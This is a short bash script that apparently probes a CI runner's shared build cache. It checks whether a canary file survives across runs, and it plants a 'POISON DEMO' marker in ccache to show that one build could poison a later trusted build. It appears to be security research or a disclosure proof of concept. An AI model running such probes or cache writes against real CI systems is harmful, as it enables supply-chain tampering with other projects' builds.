#!/usr/bin/env bash
set +e
CANARY="IBPT-RUNNER-CANARY-8842"; CACHE=/ib-workspace/cache
echo "### $CANARY recon3 start $(date -u +%FT%TZ) run=$GITHUB_RUN_ID"
echo "==== CACHE PERSISTENCE across runs ===="
echo "-- persistent volume mount --"; findmnt "$CACHE" 2>/dev/null; df -h "$CACHE" 2>/dev/null | tail -1
echo "-- did run-2 canary SURVIVE into this fresh run? --"
if [ -f "$CACHE/$CANARY.persist" ]; then echo "PERSIST=YES  contents:"; cat "$CACHE/$CANARY.persist"; else echo "PERSIST=NO (canary gone)"; fi
echo "-- append this run to prove accumulation --"
echo "run=$GITHUB_RUN_ID at $(date -u +%FT%TZ)" >> "$CACHE/$CANARY.persist" 2>/dev/null
echo "-- full cache canary history --"; cat "$CACHE/$CANARY.persist" 2>/dev/null
echo "-- is the IB accel/shim dir persistent (vdh) or ephemeral (overlay)? --"
findmnt /ib-workspace/incredibuild 2>/dev/null; findmnt / 2>/dev/null | head -2
stat -c '%n mtime=%y' /ib-workspace/incredibuild/ib-accel/bin/make 2>/dev/null
echo "-- POISON DEMO (benign, reversible): plant a marker object in ccache, confirm write --"
mkdir -p "$CACHE/ccache" 2>/dev/null
echo "poisoned-by-$GITHUB_RUN_ID-$CANARY" > "$CACHE/ccache/POISON_DEMO_$CANARY" 2>/dev/null && echo "WROTE ccache/POISON_DEMO ok (a malicious build could plant compiled objects here for a later trusted build)"
ls -la "$CACHE/ccache/" 2>/dev/null | head
echo "### $CANARY recon3 end $(date -u +%FT%TZ)"
